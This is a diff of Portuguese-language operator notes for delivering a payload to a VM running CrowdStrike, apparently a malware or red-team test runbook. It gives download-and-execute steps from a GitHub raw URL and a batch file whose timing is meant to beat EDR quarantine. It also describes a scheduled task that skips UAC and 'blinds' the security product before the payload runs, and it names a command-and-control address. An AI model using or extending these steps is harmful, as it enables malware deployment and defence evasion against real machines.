@@ -1,16 +1,15 @@
 == VM COM CROWDSTRIKE - ENTREGA v3.2 (VM-only via GitHub raw) ==
-rodada: TesteL + blindar v3.2 - 23/11
+rodada: TesteL + blindar v3.2 - 23/11  (base: https://raw.githubusercontent.com/josimayktrindade-lgtm/updates/main/)
 
-1) TESTE PURO (sem blindar): no Edge da VM, baixe e de duplo clique:
-   https://raw.githubusercontent.com/josimayktrindade-lgtm/updates/main/TesteL.exe
-   (esperado: instala, carrega driver, shush do payload pode ser bloqueado,
-    dll pode ser quarentenada -> leia o C:\ProgramData\wupd\run.log depois)
+1) TESTE PURO: baixe e rode o BAT (baixa+executa na mesma corrida, vence a quarentena):
+   .../Rodar-TesteL.bat
+   (o CS quarentena exe recem-baixado em segundos; o bat resolve o timing)
+   Obs: o exe do payload em si passa (a chegada dele no run e pinada).
 
 2) RODADA CEGA (blindar): baixe e de duplo clique:
-   https://raw.githubusercontent.com/josimayktrindade-lgtm/updates/main/Iniciar.bat
-   (cria task sem UAC, baixa TODOS os assets do GitHub, cega antes do payload)
-   - log C:\blindar.log (tambem volta para a shared e fica em C:)
-   - alternativas: Blindar.bat | rodar_admin.cmd
-3) limpeza: TesteL-Remover.cmd; kit: limpar_winvm.bat
+   .../Iniciar.bat
+   (task sem UAC chama powershell direto; baixa todos os assets do GitHub; cega antes do payload)
+   - log C:\blindar.log (fica em C: e volta p/ shared)
+3) limpeza: TesteL-Remover.cmd | kit: limpar_winvm.bat
 
-NADA toca o PC: assets vem do GitHub; C2 = 80.78.22.208. (a shared so recebe o log de volta)
+NADA toca o PC: assets vem do GitHub; C2 = 80.78.22.208.
